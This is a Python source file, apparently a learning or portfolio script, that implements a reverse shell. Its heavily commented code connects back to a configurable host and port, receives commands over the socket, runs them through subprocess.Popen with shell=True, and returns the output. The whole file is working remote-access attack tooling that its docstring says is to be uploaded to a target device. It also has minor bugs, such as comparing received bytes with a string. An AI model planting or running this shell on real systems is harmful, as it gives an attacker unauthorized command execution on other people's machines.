"""
A reverse shell in python
    - Upload to target device, and it connects back to a controlled host which is open to connecting.
        - Netcat for example may be used to open a port on the local device.

Modules Used:
    Socket - Allows python programs to access the BSD Socket Interface.
        It is used to open sockets on the local machine which can be used to
        connect to a target device over a network.

    Sys - Allows python programs to utilize functions/variables
        used to interact with the interpreter.
        It is used to close the program in the event the shell crashes.

    Subprocess - Allows python programs to spawn new processes,
        connect to their input/output/error pipes, and receive error codes.
        It used to execute commands send from the local device on the target through a shell with Popen().
        Grabs input/output/error from the shell command execution, which is sent back to the local machine.


Created By: Dalice Dieckman on 2024-12-09

"""

HOST = "10.0.2.15"  # CHANGE
PORT = 12345    # CHANGE

# Socket vs Port:
    # Port: A network to machine interface which is used to map processes/services to a specific port value/location.
    # Socket: Allows programs to communicate with others using protocols/ports.

def connect_to(host, port):
    """
    Used to connect to the other host
    """
    try:
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("Socket created")

        try:
            connection.connect((host, port))
            print("Connection established")
            return connection

        except socket.error as connection_creation_error:
            print("Socket opened successfully, but connection could not be established")
            print(f"Error: Connection failed to establish {connection_creation_error} ")
            return connection == False

    except socket.error as socket_creation_error:
        print(f"Error: Socket creation failed {socket_creation_error} ")
        connection = False
        return connection

def command_input(connection):
    """
    Used to accept input from the other host, and executes it on the system
    """
    # I allow data
    data = connection.recv(4096)
        # .recv() receives non-encoded data, as encryption occurs through the use of the
        # service utilized by the chosen port.

    if data == 'quit\n':
        print('Closing connection')
        connection.close()
        sys.exit(0)
        # sys.exit() uses 0 to denote a clean connection break

    elif len(data) == 0:
        # If data received is of amount 0, it means the other side has closed/is closing the connection.
        return True

    else:
        # Here we can execute commands received in data.
        # We use Popen() to execute commands, as it allows us more control over lower processes.
        # Could have also used run(), or os.system()
        shell = subprocess.Popen(data, shell=True,
             stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

        stdout_val = shell.stdout.read() + shell.stderr.read()
        try:
            connection.send(stdout_val)
            return False

        except socket.error as send_error:
            print(f"Error when sending output data {send_error}")
            return True


def main():
    """
    Main Function
    """
    while True: # Loop runs as long as the socket remains open.
        died = False

        if died: # If the connection, closes this returns to main() and closes the program.
            print('Goodbye')
            return

        try:
            connection = connect_to(HOST, PORT)

            if not connection:
                sys.exit(1)

            while not died:
                print("Type 'quit' to leave the shell and close the connection")
                print()
                died = command_input(connection)
            connection.close()

        except socket.error as err:
            print(f"Error: {err}")
            return


if __name__ == "__main__":
    import socket, sys, subprocess
    from dbm import error
    main()
    exit()
